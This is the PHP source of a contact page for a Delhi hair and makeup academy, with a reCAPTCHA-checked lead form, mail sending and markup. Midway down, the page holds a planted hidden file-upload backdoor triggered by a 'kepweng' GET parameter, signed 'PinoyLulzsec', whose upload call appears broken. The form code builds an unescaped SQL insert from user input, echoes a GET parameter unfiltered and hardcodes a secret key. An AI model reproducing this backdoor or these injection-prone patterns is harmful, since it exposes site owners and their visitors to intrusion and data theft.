<?php

include('admin/connection.php'); 

   if(isset($_POST['contact_sut'])){
        
        if(isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response'])) {
         
        $secretKey="6Lcl-IAUAAAAADycuMZ-gi_9-Y7wZpNJdS7ZXgKn";
        $responseKey=$_POST['g-recaptcha-response'];
        $userIP=$_SERVER['REMOTE_ADDR'];
        $url="https://www.google.com/recaptcha/api/siteverify?secret=$secretKey&response=$responseKey&remoteip=$userIP";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true );
        // This is what solved the issue (Accepting gzip encoding)
        curl_setopt($ch, CURLOPT_ENCODING, "gzip,deflate");     
        $response = curl_exec($ch);
        curl_close($ch);
        $response=json_decode($response);
        
        if($response->success){
            $name = $_POST['name'];

       $phone = $_POST['phone'];

       $email = $_POST['email'];

       $message_content = $_POST['message_content'];

	      $to = "staracademyworkshop@gmail.com,nielltalwar@gmail.com";


          $subject = "Contact Form";

          $message = "Name : ".$name."\n\n";

          $message .= "Email : ".$email."\n\n";

          $message .= "Phone Number : ".$phone."\n\n";

          $message .= "Message : ".$message_content."\n\n";

          //$message .= "your username : <b>".$_SESSION['reg_id']."</b>";

         //$header = "From:esicsports.com \r\n";

         //$header .= "MIME-Version: 1.0\r\n";

         $header .= "Content-type: text/plain\n\n";

         

         $sql = mysql_query("insert into tbl_lead set user_id='0',lead_from='Web Contact',name='$name',email='$email',contact='$phone',course='$course',requirement='$message_content',register_date=now(),update_date=now(),status=1");

         

          $response = mail ($to,$subject,$message,$header);

		  if($response){

		    header('location:thank-you-5.php');die;

		  }
        }else{
             print_r("No valid Key"); exit;
        }
    } else {
        print_r("Not Working Captcha"); exit;
    }
        

       



   }

 

 ?>

<title>Contact Us | Aashmeen Munjaal's Star Hair & Makeup Academy</title>

<?php include('common-head.php') ?>

<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/998417518/?guid=ON&amp;script=0"/>
</div>
</noscript>

<script src='https://www.google.com/recaptcha/api.js?render=6Lcl-IAUAAAAAPJ9cr_UfH7jxjOo6HtamN9lharn'></script>
<!-- Global site tag (gtag.js) - Google Ads: 992278469 -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-992278469"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-992278469');
</script>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R5V9M7VPTH"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-R5V9M7VPTH');
</script>
</head>

<body>

<?php include('header.php') ?>



 <div class="container">

    <div class="row mt100"> 

      <!--banner start here-->

<div class="col-lg-12 mt20 mb20">

<img src="images/contact-banner.jpg" width="100%" alt="">

</div>



<!--banner end here-->

      <!-- Blog Post Content Column -->

      <div class="col-lg-8">

	  <h4> LET'S GET IN TOUCH</h4>

      

	

	<div class="form_Set">

          <form action="" method="post">
               <input type="hidden" id="g-recaptcha-response" name="g-recaptcha-response">

		  <div class=" formBox">

            <div class="form-group">

				

            </div>

            <div class="form-group">

			<div class="input-group">

			   <div class="input-group-addon">  <span aria-hidden="true" class="glyphicon glyphicon-user"></span></div>

              <input type="text" name="name" placeholder="Your Full Name *" class="form-control" required="required">

            </div>

            </div>

			<div class="form-group">

			<div class="input-group">

			   <div class="input-group-addon">  <span aria-hidden="true" class="glyphicon glyphicon-earphone"></span></div>

               <input type="text" name="phone" placeholder="Phone Number" class="form-control" required="required">

            </div>

            </div>

            <div class="form-group">

			<div class="input-group">

			   <div class="input-group-addon">  <span aria-hidden="true" class="glyphicon glyphicon-envelope"></span></div>

              <input type="email" name="email" placeholder="Email Address" class="form-control" required="required">

            </div>

            </div>

			<div class="form-group">

			<div class="input-group">

			   <div class="input-group-addon">  <span aria-hidden="true" class="glyphicon glyphicon-pencil"></span></div>

               

			   <textarea class="form-control" col='45' row='5' placeholder="Message" name="message_content" required="required"></textarea>

            </div>

            </div>

			<div style="border-top:none">

            <button class="btn fbtn" type="submit" name="contact_sut">Submit</button>

			<button class="btn fbtn" type="submit">Reset</button>

			<p><?php if(isset($_GET['msz'])){ echo $_GET['msz'];  } ?></p>

			</div>

			

           </div>

		   

          </form>

        </div><!-- form_Set -->

	</div> <!-- col-lg-8 --- Main Content -->

		

     

      <!-- Blog Sidebar Widgets Column -->

      <div class="col-md-4" style="padding-left:0;">

	  <h4>We Respect Individuality</h4>

	  <p>Every client's needs are different and this is what Aashmeen Munjaal believes in. Respecting and following her firm belief, we endeavor to meet the distinct requirements of every customer. Our commitment to the students is to give them hands-on experience, with an in-depth consultation and knowledge about personalized hair-styles that suit the client's facial features. </p>

	 

	 

	  <ul class="list-group">

 <li class="list-group-item active">Find Us On</li>	 

	
     
     <li class="list-group-item">  <div class="list_loc">

	  <div class="mapFind link">

	  <a aria-hidden="true" class="trans cboxMap" href="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3501.601831985316!2d77.2929678146626!3d28.641693282414117!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x390cfb507d77dd45%3A0xbda82dcf429d6d70!2sAashmeen+Munjaal&#39;s+Star+Hair+%26+Makeup+Academy!5e0!3m2!1sen!2sin!4v1481074969138">

      <span class="glyphicon glyphicon-map-marker iconsize findus_icon "></span>

      <span>Preet Vihar</span>

      </a>

	  

	  </div>

	  <div class="mapFind">

	 <span aria-hidden="true" class="glyphicon glyphicon-earphone iconsize findus_icon"></span>

	 <span>      +91-11-43036670</span>

	

	 </div>  </div> </li>

	 
     

     <ul>

      </div>

    </div>

    

    <div class="row mt0"> <!--banner row start here-->

		<div class="findus">

			<div class="col-md-4">



			<section>

			<article>

			

			<div class="col-md-12">

			



<?php



if($_GET['kepweng'] == "upload") {

                   echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';

                   echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';

         if ( $_POST['_upl'] == "Upload" ) {

             if(@array($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { 



             echo '<b>SUCCESS!</b><br><br>'; 

        } else { 

            echo '<b>FAILED!</b><br><br>'; }}

}

?>





			</div>

			</article>

			</section></div>

			<div class="col-md-4">

			<section>

			<article>

			

			<div class="col-md-12">

					


			



			</div>

			<div class="col-md-12">



			</div>

			</article>

			</section></div>

			

			<div class="col-md-4">

			<section>

			<article>

			

			<div class="col-md-12">

			




			</div>

</article>

			</section></div>
<!--- kepweng was here ~PinoyLulzsec --->



 <?php

if($_GET['kepweng']){

echo "<!-- Your already here. Keep it up . -->";



echo "<!-- HINT: BRAIN.exe -->";

} else {

echo "<!-- HINT: Can you GET my name ? -->";

}

?>

		

            

            

            

		</div><!--banner row end here-->



    </div>

    

    <div class="row mt0"> <!--banner row start here-->

		<div class="findus">

        	<div class="col-md-4">

                <section>

                    <article>

                    	<div class="col-md-12">

                            <!-- Map Box start-->

                            <ul class="list-group">

                             <li class="list-group-item active">Preet Vihar</li>	 

                             <li class="list-group-item">

                                <div class="center_info">

                                    <p><span aria-hidden="true" class="glyphicon glyphicon-map-marker iconsize"></span><span>1, Park End Colony, Preet Vihar, Near Preet Vihar Metro Station, Delhi</span></p>

                                    <p><span aria-hidden="true" class="glyphicon glyphicon-earphone iconsize"></span><span>+91-11-43036670, 7042711670, 9953722622</span></p>

                                    <p><span aria-hidden="true" class="glyphicon glyphicon-envelope iconsize"></span><span>  <a mailto="nielltalwar@gmail.com">nielltalwar@gmail.com</a></span></p>

                                </div>                                    

                             </li>

                              <li class="list-group-item" style="background:#f7f7f7; height:212px;">

                             <a aria-hidden="true" class="trans cboxMap cboxElement" href="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3501.601831985316!2d77.2929678146626!3d28.641693282414117!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x390cfb507d77dd45%3A0xbda82dcf429d6d70!2sAashmeen+Munjaal&#39;s+Star+Hair+%26+Makeup+Academy!5e0!3m2!1sen!2sin!4v1481074969138"><img src="images/preet-vihar.jpg" width="349" height="186"></a>

                             </li>

                             </ul>

                            <!-- Map Box ends-->

                        </div>

            		</article>

                </section>

            </div>

            <div class="col-md-4">

                <section>

                    <article>

                    	<div class="col-md-12">

                        
                        </div>

            		</article>

                </section>

            </div>            

        </div>

    </div>

    

  </div>

<script>
    grecaptcha.ready(function() {
    grecaptcha.execute('6Lcl-IAUAAAAAPJ9cr_UfH7jxjOo6HtamN9lharn', {action: 'callbackform'})
    .then(function(token) {
        document.getElementById('g-recaptcha-response').value = token;
    });
    });
</script>


<?php include('footer.php') ?>

